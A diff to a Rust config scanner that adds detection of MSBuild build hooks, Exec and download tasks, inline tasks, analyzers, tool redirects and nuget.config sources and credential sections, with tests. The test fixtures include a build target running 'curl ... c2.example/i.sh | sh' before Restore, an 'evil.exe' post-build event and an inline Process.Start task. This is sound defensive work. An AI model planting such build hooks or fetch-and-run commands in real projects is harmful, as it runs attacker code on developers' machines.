@@ -14,6 +14,10 @@
 //! - `devcontainer.json`: the commands a dev container runs, and its features.
 //! - `composer.json`: Composer script events.
 //! - `global.json`: MSBuild SDKs, whose props and targets run during a build.
+//! - MSBuild files (`Directory.Build.props` and `.targets`, `*.csproj`, `*.props`, `*.targets`):
+//!   targets that hook into a build, `Exec` and other tasks, pre- and post-build events, inline and
+//!   assembly tasks, analyzers, SDKs from NuGet, tool redirects and imports.
+//! - `nuget.config`: package sources other than the public feed, and where credentials are stored.
 //!
 //! A file that does not parse gets a `ParseFailed` fact, so it stays visible and the brief says
 //! incomplete. Repeated keys are flagged, as in `package.json`: parsers disagree about which one
@@ -23,10 +27,11 @@
 //! `include.path`, and keys not listed above.
 
 use super::json::{self, Jv, Kind, Member};
+use super::xml::{self, Element};
 use forge_analysis_schema::{
     number_repeats, FactKind, Quoted, RelPath, Script, ScriptTrigger, Span, StaticFact, UnresolvedReason,
 };
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum Manifest {
@@ -37,6 +42,82 @@ enum Manifest {
     DevContainer,
     Composer,
     GlobalJson,
+    Msbuild,
+    NuGet,
+}
+
+/// Imports of the toolset itself, which every project has.
+const STANDARD_IMPORTS: &[&str] = &[
+    "$(msbuildtoolspath)",
+    "$(msbuildtoolsversion)",
+    "$(msbuildextensionspath",
+    "$(msbuildbinpath)",
+    "$(vstoolspath)",
+    "$(msbuildprogramfiles32)",
+    "$(msbuildsdkspath)",
+];
+
+/// Properties that make the build run a program from a path in place of the one the SDK picks.
+const TOOL_REDIRECTS: &[&str] = &[
+    "csctoolpath",
+    "csctoolexe",
+    "vbctoolpath",
+    "vbctoolexe",
+    "fsctoolpath",
+    "fsctoolexe",
+    "roslyntargetspath",
+    "nugetexepath",
+    "dotnethostpath",
+    "msbuildtoolspath",
+    "msbuildsdkspath",
+];
+
+/// Properties that change where restored packages come from or go to.
+const PACKAGE_REDIRECTS: &[&str] = &[
+    "restoresources",
+    "restoreadditionalprojectsources",
+    "restorefallbackfolders",
+    "restorepackagespath",
+    "nugetconfigfile",
+];
+
+/// Tasks that ship with MSBuild and do bookkeeping or plain file work. They are not reported. `Exec`,
+/// `DownloadFile` and everything else (`Unzip`, the `MSBuild` task, tasks from a `UsingTask`) is.
+const BUILTIN_TASKS: &[&str] = &[
+    "message",
+    "warning",
+    "error",
+    "itemgroup",
+    "propertygroup",
+    "onerror",
+    "output",
+    "calltarget",
+    "createitem",
+    "createproperty",
+    "readlinesfromfile",
+    "writelinestofile",
+    "copy",
+    "move",
+    "delete",
+    "removedir",
+    "makedir",
+    "touch",
+    "getfilehash",
+    "hash",
+    "assignculture",
+    "assigntargetpath",
+    "findunderpath",
+    "removeduplicates",
+    "converttoabsolutepath",
+    "getassemblyidentity",
+    "resolvepackagefilepath",
+];
+
+/// The sources NuGet uses when nothing says otherwise.
+const NUGET_ORG: &[&str] = &["https://api.nuget.org/v3/index.json", "https://www.nuget.org/api/v2", "https://nuget.org/api/v2"];
+
+fn names_in(list: &str) -> Vec<String> {
+    list.split(';').map(|s| s.trim().to_ascii_lowercase()).filter(|s| !s.is_empty()).collect()
 }
 
 fn normalise(path: &str) -> String {
@@ -66,6 +147,20 @@ fn manifest(path: &str) -> Option<(Manifest, bool)> {
         Some((Manifest::Composer, false))
     } else if name == "global.json" {
         Some((Manifest::GlobalJson, true))
+    } else if name == "nuget.config" {
+        Some((Manifest::NuGet, false))
+    } else if matches!(
+        name,
+        "directory.build.props"
+            | "directory.build.targets"
+            | "directory.solution.props"
+            | "directory.solution.targets"
+            | "directory.packages.props"
+    ) || ["csproj", "fsproj", "vbproj", "vcxproj", "proj", "props", "targets"]
+        .iter()
+        .any(|e| name.rsplit_once('.').is_some_and(|(_, x)| x == *e))
+    {
+        Some((Manifest::Msbuild, false))
     } else {
         None
     }
@@ -87,6 +182,12 @@ pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
     let mut cf = Cf::new(file, src);
     if kind == Manifest::GitConfig {
         cf.git_config();
+    } else if matches!(kind, Manifest::Msbuild | Manifest::NuGet) {
+        match xml::parse(src) {
+            Err(_) => cf.unresolved(0, cf.len(), UnresolvedReason::ParseFailed, None),
+            Ok(root) if kind == Manifest::Msbuild => cf.msbuild(&root),
+            Ok(root) => cf.nuget(&root),
+        }
     } else {
         let parsed = if lenient { json::parse_lenient(src) } else { json::parse(src) };
         match parsed {
@@ -98,7 +199,7 @@ pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
                 Manifest::DevContainer => cf.dev_container(&root),
                 Manifest::Composer => cf.composer(&root),
                 Manifest::GlobalJson => cf.global(&root),
-                Manifest::GitConfig => {}
+                Manifest::GitConfig | Manifest::Msbuild | Manifest::NuGet => {}
             },
         }
     }
@@ -533,6 +634,228 @@ impl<'s> Cf<'s> {
                 let version = string(&s.value).unwrap_or("");
                 // The SDK is a package; its props and targets are imported into every project.
                 self.script("msbuild-sdk", &format!("{}/{version}", s.key), s.key_start, s.value.end, ScriptTrigger::OnBuild);
+            }
+        }
+    }
+
+    // ---- MSBuild projects, props and targets; nuget.config ----
+
+    /// `Sdk="Name/Version;Other"`: SDKs from NuGet whose props and targets run during every build.
+    /// The ones Microsoft ships with the .NET SDK are not reported.
+    fn sdk_list(&mut self, value: &str, start: u32, end: u32) {
+        for part in value.split(';') {
+            let part = part.trim();
+            let name = part.split('/').next().unwrap_or("").to_ascii_lowercase();
+            if part.is_empty() || name.starts_with("microsoft.net.sdk") || name.starts_with("microsoft.build.") {
+                continue;
+            }
+            self.script("msbuild-sdk", part, start, end, ScriptTrigger::OnBuild);
+        }
+    }
+
+    fn msbuild(&mut self, root: &Element) {
+        if !root.is("Project") {
+            self.unresolved(root.start, root.end, UnresolvedReason::UnsupportedSyntax, Some("not an MSBuild project"));
+            return;
+        }
+        if let Some(a) = root.attr("Sdk") {
+            self.sdk_list(&a.value, a.start, a.end);
+        }
+        let mut initial: BTreeSet<String> = BTreeSet::new();
+        for attr in ["InitialTargets", "DefaultTargets"] {
+            if let Some(a) = root.attr(attr) {
+                initial.extend(names_in(&a.value));
+            }
+        }
+        let mut targets: Vec<&Element> = Vec::new();
+        self.msbuild_children(root, &mut targets);
+        self.msbuild_targets(&targets, &initial);
+    }
+
+    fn msbuild_children<'e>(&mut self, parent: &'e Element, targets: &mut Vec<&'e Element>) {
+        for c in parent.elements() {
+            let name = c.name.to_ascii_lowercase();
+            match name.as_str() {
+                "target" => targets.push(c),
+                "sdk" => {
+                    if let Some(n) = c.attr("Name") {
+                        let v = c.attr("Version").map(|v| format!("/{}", v.value)).unwrap_or_default();
+                        self.sdk_list(&format!("{}{v}", n.value), c.start, c.end);
+                    }
+                }
+                "import" => {
+                    if let Some(s) = c.attr("Sdk") {
+                        self.sdk_list(&s.value, s.start, s.end);
+                    }
+                    if let Some(p) = c.attr("Project") {
+                        // `Sdk.props` and the toolset files are the standard ones; anything else is a file we
+                        // do not follow yet, and it can hold targets.
+                        let low = p.value.to_ascii_lowercase();
+                        let standard = low == "sdk.props"
+                            || low == "sdk.targets"
+                            || STANDARD_IMPORTS.iter().any(|s| low.starts_with(s));
+                        if !standard {
+                            self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("import {}", p.value)));
+                        }
+                    }
+                }
+                "propertygroup" => self.msbuild_properties(c),
+                "itemgroup" => self.msbuild_items(c),
+                "usingtask" => self.msbuild_using_task(c),
+                "choose" => {
+                    for branch in c.elements() {
+                        self.msbuild_children(branch, targets);
+                    }
+                }
+                _ => {}
+            }
+        }
+    }
+
+    fn msbuild_properties(&mut self, group: &Element) {
+        for p in group.elements() {
+            let name = p.name.to_ascii_lowercase();
+            let Some((text, ts, te)) = p.text() else { continue };
+            let text = text.trim();
+            if name == "prebuildevent" || name == "postbuildevent" {
+                self.command(&p.name, text, ts, te, ScriptTrigger::OnBuild);
+            } else if TOOL_REDIRECTS.contains(&name.as_str()) {
+                // Runs a program from this path in place of the one the SDK would use.
+                self.script(&p.name, &format!("{} = {text}", p.name), ts, te, ScriptTrigger::OnBuild);
+            } else if PACKAGE_REDIRECTS.contains(&name.as_str()) {
+                self.unresolved(ts, te, UnresolvedReason::UnsupportedSyntax, Some(&format!("{} = {text}", p.name)));
+            }
+        }
+    }
+
+    fn msbuild_items(&mut self, group: &Element) {
+        for item in group.elements() {
+            let name = item.name.to_ascii_lowercase();
+            let analyzer = name == "analyzer"
+                || (name == "projectreference"
+                    && item.attr("OutputItemType").is_some_and(|a| a.value.to_ascii_lowercase().contains("analyzer")));
+            if analyzer {
+                // Analyzers are loaded into the compiler: their code runs on every build.
+                let what = item.attr("Include").or_else(|| item.attr("Update")).map(|a| a.value.as_str()).unwrap_or("");
+                self.script("analyzer", what, item.start, item.end, ScriptTrigger::OnBuild);
+            }
+        }
+    }
+
+    fn msbuild_using_task(&mut self, ut: &Element) {
+        let task = ut.attr("TaskName").map(|a| a.value.as_str()).unwrap_or("?");
+        let inline = ut.elements().find(|e| e.is("Task")).and_then(|t| t.elements().find(|c| c.is("Code")));
+        let name = format!("UsingTask {task}");
+        if let Some((code, _, _)) = inline.and_then(|c| c.text()) {
+            // Code compiled and run by the build.
+            self.script(&name, &code, ut.start, ut.end, ScriptTrigger::OnBuild);
+            self.unresolved(ut.start, ut.end, UnresolvedReason::UnsupportedSyntax, Some("inline task code is not analysed"));
+        } else {
+            let from = ut
+                .attr("AssemblyFile")
+                .or_else(|| ut.attr("AssemblyName"))
+                .map(|a| a.value.as_str())
+                .unwrap_or("?");
+            self.script(&name, from, ut.start, ut.end, ScriptTrigger::OnBuild);
+            self.unresolved(ut.start, ut.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("task assembly {from} is not analysed")));
+        }
+    }
+
+    fn msbuild_targets(&mut self, targets: &[&Element], initial: &BTreeSet<String>) {
+        // A target runs by itself if it asks to run before or after another target, or the project names
+        // it as an initial or default target. So does every target such a target calls or depends on.
+        let hooked = |t: &Element| {
+            ["BeforeTargets", "AfterTargets"].iter().any(|a| t.attr(a).is_some_and(|v| !v.value.trim().is_empty()))
+        };
+        let tname = |t: &Element| t.attr("Name").map(|a| a.value.to_ascii_lowercase()).unwrap_or_default();
+        let mut by_name: BTreeMap<String, Vec<usize>> = BTreeMap::new();
+        for (i, t) in targets.iter().enumerate() {
+            by_name.entry(tname(t)).or_default().push(i);
+        }
+        let mut auto: Vec<bool> = targets.iter().map(|t| hooked(t) || initial.contains(&tname(t))).collect();
+        let mut queue: Vec<usize> = (0..targets.len()).filter(|&i| auto[i]).collect();
+        while let Some(i) = queue.pop() {
+            let t = targets[i];
+            let mut called: Vec<String> = t.attr("DependsOnTargets").map(|a| names_in(&a.value)).unwrap_or_default();
+            for c in t.elements().filter(|c| c.is("CallTarget")) {
+                if let Some(a) = c.attr("Targets") {
+                    called.extend(names_in(&a.value));
+                }
+            }
+            for n in called {
+                for &j in by_name.get(&n).into_iter().flatten() {
+                    if !auto[j] {
+                        auto[j] = true;
+                        queue.push(j);
+                    }
+                }
+            }
+        }
+        for (i, t) in targets.iter().enumerate() {
+            let trigger = if auto[i] { ScriptTrigger::OnBuild } else { ScriptTrigger::Manual };
+            let target = t.attr("Name").map(|a| a.value.as_str()).unwrap_or("(unnamed)");
+            for c in t.elements() {
+                let task = c.name.to_ascii_lowercase();
+                match task.as_str() {
+                    "exec" => match c.attr("Command") {
+                        Some(cmd) => self.command(target, &cmd.value, cmd.start, cmd.end, trigger),
+                        None => self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some("Exec without a Command")),
+                    },
+                    "downloadfile" => {
+                        let url = c.attr("SourceUrl").map(|a| a.value.as_str()).unwrap_or("?");
+                        self.script(&format!("{target}/DownloadFile"), url, c.start, c.end, trigger);
+                    }
+                    t if BUILTIN_TASKS.contains(&t) => {}
+                    // Unzip, the MSBuild task (which runs other projects), and tasks from a `UsingTask`
+                    // or an assembly: code we cannot see into. Only reported where it runs by itself.
+                    _ if auto[i] => {
+                        let mut what = c.name.clone();
+                        for a in c.attrs.iter().take(4) {
+                            what.push_str(&format!(" {}={}", a.name, a.value));
+                        }
+                        self.script(&format!("{target}/{}", c.name), &what, c.start, c.end, trigger);
+                        self.unresolved(c.start, c.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("task {} is not analysed", c.name)));
+                    }
+                    _ => {}
+                }
+            }
+        }
+    }
+
+    fn nuget(&mut self, root: &Element) {
+        if !root.is("configuration") {
+            self.unresolved(root.start, root.end, UnresolvedReason::UnsupportedSyntax, Some("not a nuget.config"));
+            return;
+        }
+        for section in root.elements() {
+            let sname = section.name.to_ascii_lowercase();
+            match sname.as_str() {
+                "packagesources" | "fallbackpackagefolders" => {
+                    for add in section.elements().filter(|e| e.is("add")) {
+                        let key = add.attr("key").map(|a| a.value.as_str()).unwrap_or("");
+                        let value = add.attr("value").map(|a| a.value.as_str()).unwrap_or("");
+                        let v = value.trim().trim_end_matches('/').to_ascii_lowercase();
+                        // The public feed is the default; any other place packages come from is reported.
+                        if sname == "packagesources" && NUGET_ORG.contains(&v.as_str()) {
+                            continue;
+                        }
+                        self.unresolved(add.start, add.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("package source {key}: {value}")));
+                    }
+                }
+                "config" => {
+                    for add in section.elements().filter(|e| e.is("add")) {
+                        let key = add.attr("key").map(|a| a.value.to_ascii_lowercase()).unwrap_or_default();
+                        if matches!(key.as_str(), "repositorypath" | "globalpackagesfolder" | "defaultpushsource") {
+                            let value = add.attr("value").map(|a| a.value.as_str()).unwrap_or("");
+                            self.unresolved(add.start, add.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{key}: {value}")));
+                        }
+                    }
+                }
+                // Credentials and API keys. The values are never quoted: only that they are here.
+                "packagesourcecredentials" | "apikeys" => {
+                    self.unresolved(section.start, section.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{} are stored here (values not shown)", section.name)));
+                }
+                _ => {}
             }
         }
     }
@@ -1023,6 +1346,206 @@ mod tests {
         ] {
             let f = run(p, s);
             assert!(!f.is_empty(), "{p} {s}");
+        }
+    }
+
+    #[test]
+    fn msbuild_targets_that_hook_a_build_run_by_themselves() {
+        let f = run(
+            "Directory.Build.targets",
+            r#"<Project>
+  <Target Name="Fetch" BeforeTargets="Restore"><Exec Command="curl -s https://c2.example/i.sh | sh" /></Target>
+  <Target Name="Manual"><Exec Command="make docs" /></Target>
+  <Target Name="Chain" AfterTargets="Build" DependsOnTargets="Dep"><CallTarget Targets="Called" /></Target>
+  <Target Name="Dep"><Exec Command="dep.sh" /></Target>
+  <Target Name="Called"><Exec Command="called.sh" /></Target>
+  <Target Name="Init"><Exec Command="init.sh" /></Target>
+</Project>"#,
+        );
+        assert!(has(&f, "Fetch", ScriptTrigger::OnBuild));
+        assert!(has(&f, "Manual", ScriptTrigger::Manual));
+        // Pulled in by a target that hooks a build: a dependency and a called target.
+        assert!(has(&f, "Dep", ScriptTrigger::OnBuild));
+        assert!(has(&f, "Called", ScriptTrigger::OnBuild));
+        assert!(has(&f, "Init", ScriptTrigger::Manual));
+        let s = scripts(&f);
+        assert!(s.iter().any(|(n, c, _)| n == "Fetch" && c == "curl -s https://c2.example/i.sh | sh"));
+        // Each command is also an unfollowed command.
+        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count(), s.len());
+        // The project can name a target to run first.
+        let g = run("a.csproj", r#"<Project InitialTargets="Init"><Target Name="Init"><Exec Command="x" /></Target></Project>"#);
+        assert!(has(&g, "Init", ScriptTrigger::OnBuild));
+    }
+
+    #[test]
+    fn msbuild_names_are_read_without_regard_to_case() {
+        let f = run("a.targets", r#"<project><target name="x" aftertargets="Build"><EXEC command="id" /></target></project>"#);
+        assert!(has(&f, "x", ScriptTrigger::OnBuild));
+    }
+
+    #[test]
+    fn msbuild_tasks_other_than_plain_bookkeeping_are_reported_where_they_run_by_themselves() {
+        let f = run(
+            "a.targets",
+            r#"<Project>
+  <UsingTask TaskName="Evil" AssemblyFile="tools/evil.dll" />
+  <Target Name="T" AfterTargets="Build">
+    <Message Text="hi" /><Copy SourceFiles="a" DestinationFolder="b" /><Delete Files="c" />
+    <DownloadFile SourceUrl="https://x.example/p.zip" DestinationFolder="d" />
+    <Unzip SourceFiles="d/p.zip" DestinationFolder="e" />
+    <Evil Arg="1" />
+    <MSBuild Projects="other.proj" />
+  </Target>
+  <Target Name="Quiet"><Evil /><Unzip SourceFiles="x" /></Target>
+</Project>"#,
+        );
+        let s = scripts(&f);
+        assert!(s.iter().any(|(n, c, t)| n == "T/DownloadFile" && c == "https://x.example/p.zip" && *t == ScriptTrigger::OnBuild));
+        assert!(has(&f, "T/Unzip", ScriptTrigger::OnBuild));
+        assert!(has(&f, "T/Evil", ScriptTrigger::OnBuild));
+        assert!(has(&f, "T/MSBuild", ScriptTrigger::OnBuild));
+        // Plain file work and messages are not reported, and neither are tasks in a target nothing hooks.
+        assert!(!s.iter().any(|(n, _, _)| n.contains("Copy") || n.contains("Delete") || n.contains("Message")));
+        assert!(!s.iter().any(|(n, _, _)| n.starts_with("Quiet")));
+        // The assembly behind a `UsingTask` is named and flagged as not analysed.
+        assert!(s.iter().any(|(n, c, _)| n == "UsingTask Evil" && c == "tools/evil.dll"));
+        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
+    }
+
+    #[test]
+    fn a_csproj_reports_build_events_analyzers_sdks_redirects_and_imports() {
+        let f = run(
+            "src/App/App.csproj",
+            r#"<Project Sdk="Microsoft.NET.Sdk;Evil.Sdk/1.0.0">
+  <Sdk Name="Other.Sdk" Version="2.0" />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\build\local.targets" />
+  <Import Sdk="Third.Sdk" Project="Sdk.props" />
+  <PropertyGroup>
+    <TargetFramework>net8.0</TargetFramework>
+    <PostBuildEvent>copy $(TargetPath) c:\out &amp; evil.exe</PostBuildEvent>
+    <CscToolPath>tools\roslyn</CscToolPath>
+    <RestoreSources>https://feed.example/v3/index.json</RestoreSources>
+  </PropertyGroup>
+  <Choose><When Condition="true"><PropertyGroup><PreBuildEvent>pre.cmd</PreBuildEvent></PropertyGroup></When></Choose>
+  <ItemGroup>
+    <Analyzer Include="tools\a.dll" />
+    <ProjectReference Include="..\gen\Gen.csproj" OutputItemType="Analyzer" />
+    <PackageReference Include="Newtonsoft.Json" Version="13.0.1" />
+  </ItemGroup>
+</Project>"#,
+        );
+        let s = scripts(&f);
+        assert!(s.iter().any(|(n, c, t)| n == "msbuild-sdk" && c == "Evil.Sdk/1.0.0" && *t == ScriptTrigger::OnBuild));
+        assert!(s.iter().any(|(n, c, _)| n == "msbuild-sdk" && c == "Other.Sdk/2.0"));
+        assert!(s.iter().any(|(n, c, _)| n == "msbuild-sdk" && c == "Third.Sdk"));
+        // The SDK Microsoft ships is not reported.
+        assert!(!s.iter().any(|(_, c, _)| c.starts_with("Microsoft.NET.Sdk")));
+        assert!(s.iter().any(|(n, c, _)| n == "PostBuildEvent" && c == "copy $(TargetPath) c:\\out & evil.exe"));
+        assert!(has(&f, "PreBuildEvent", ScriptTrigger::OnBuild));
+        assert!(s.iter().any(|(n, c, _)| n == "CscToolPath" && c == "CscToolPath = tools\\roslyn"));
+        assert_eq!(s.iter().filter(|(n, _, _)| n == "analyzer").count(), 2);
+        // A package reference is not a command, and is not reported here.
+        assert!(!s.iter().any(|(_, c, _)| c.contains("Newtonsoft")));
+        let un: Vec<&str> = f
+            .iter()
+            .filter(|x| x.unresolved == Some(UnresolvedReason::UnsupportedSyntax))
+            .filter_map(|x| x.detail().map(|d| d.text()))
+            .collect();
+        assert!(un.contains(&"import ..\\build\\local.targets"), "{un:?}");
+        assert!(un.iter().any(|d| d.starts_with("RestoreSources = ")), "{un:?}");
+        // The standard toolset import is not.
+        assert!(!un.iter().any(|d| d.contains("MSBuildToolsPath")));
+    }
+
+    #[test]
+    fn inline_task_code_is_quoted_and_flagged() {
+        let f = run(
+            "a.targets",
+            r#"<Project><UsingTask TaskName="Inline" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="x.dll"><Task><Code Type="Fragment" Language="cs"><![CDATA[System.Diagnostics.Process.Start("calc");]]></Code></Task></UsingTask></Project>"#,
+        );
+        let s = scripts(&f);
+        assert_eq!(s.len(), 1);
+        assert!(s[0].1.contains("Process.Start"));
+        assert_eq!(s[0].2, ScriptTrigger::OnBuild);
+        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
+    }
+
+    #[test]
+    fn a_plain_project_holds_nothing_automatic() {
+        for (p, s) in [
+            ("a.csproj", r#"<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="X" Version="1" /></ItemGroup></Project>"#),
+            ("Directory.Build.props", "<Project><PropertyGroup><LangVersion>latest</LangVersion></PropertyGroup></Project>"),
+            ("Directory.Packages.props", "<Project><ItemGroup><PackageVersion Include=\"X\" Version=\"1\" /></ItemGroup></Project>"),
+        ] {
+            assert!(run(p, s).is_empty(), "{p}");
+        }
+    }
+
+    #[test]
+    fn nuget_config_reports_other_sources_and_where_credentials_are_without_their_values() {
+        let f = run(
+            "NuGet.Config",
+            r#"<configuration>
+  <packageSources>
+    <clear />
+    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
+    <add key="internal" value="http://feed.example/nuget" />
+    <add key="local" value="..\packages" />
+  </packageSources>
+  <packageSourceCredentials><internal><add key="Username" value="bob" /><add key="ClearTextPassword" value="hunter2-secret" /></internal></packageSourceCredentials>
+  <config><add key="globalPackagesFolder" value="c:\x" /><add key="other" value="y" /></config>
+</configuration>"#,
+        );
+        let un: Vec<String> = f.iter().filter_map(|x| x.detail().map(|d| d.text().to_string())).collect();
+        assert!(un.contains(&"package source internal: http://feed.example/nuget".to_string()), "{un:?}");
+        assert!(un.contains(&"package source local: ..\\packages".to_string()), "{un:?}");
+        assert!(un.iter().any(|d| d.starts_with("globalpackagesfolder: ")), "{un:?}");
+        assert!(un.iter().any(|d| d.contains("values not shown")), "{un:?}");
+        // The default feed is not reported, and no credential value is ever quoted.
+        assert!(!un.iter().any(|d| d.contains("api.nuget.org")));
+        assert!(!un.iter().any(|d| d.contains("hunter2") || d.contains("bob")));
+        // Only the public feed: nothing to report.
+        assert!(run("nuget.config", r#"<configuration><packageSources><add key="n" value="https://api.nuget.org/v3/index.json/" /></packageSources></configuration>"#).is_empty());
+    }
+
+    #[test]
+    fn msbuild_and_nuget_files_that_are_not_wellformed_say_so() {
+        for (p, s) in [
+            ("a.csproj", "<Project><Target></Project>"),
+            ("a.csproj", "<!DOCTYPE p [<!ENTITY x \"y\">]><Project>&x;</Project>"),
+            ("a.targets", ""),
+            ("Directory.Build.props", "<Project a=\"1\" a=\"2\" />"),
+            ("nuget.config", "<configuration>&nbsp;</configuration>"),
+        ] {
+            assert_eq!(reasons(&run(p, s)), vec![UnresolvedReason::ParseFailed], "{p}");
+        }
+        // Well-formed XML that is not what the file name says.
+        assert_eq!(reasons(&run("a.csproj", "<Other />")), vec![UnresolvedReason::UnsupportedSyntax]);
+        assert_eq!(reasons(&run("nuget.config", "<Other />")), vec![UnresolvedReason::UnsupportedSyntax]);
+    }
+
+    #[test]
+    fn the_msbuild_file_names_are_recognised() {
+        for p in [
+            "Directory.Build.props",
+            "src/Directory.Build.targets",
+            "Directory.Solution.props",
+            "Directory.Packages.props",
+            "App.csproj",
+            "lib/Lib.FSPROJ",
+            "x.vbproj",
+            "native/n.vcxproj",
+            "build.proj",
+            "build/common.props",
+            "build/tasks.TARGETS",
+            "nuget.config",
+            "a/NuGet.Config",
+        ] {
+            assert!(is_config_manifest(p), "{p}");
+        }
+        for p in ["props.txt", "csproj", "a.props.bak", "Directory.Build.rsp", "nuget.configx", "App.sln"] {
+            assert!(!is_config_manifest(p), "{p}");
         }
     }
 
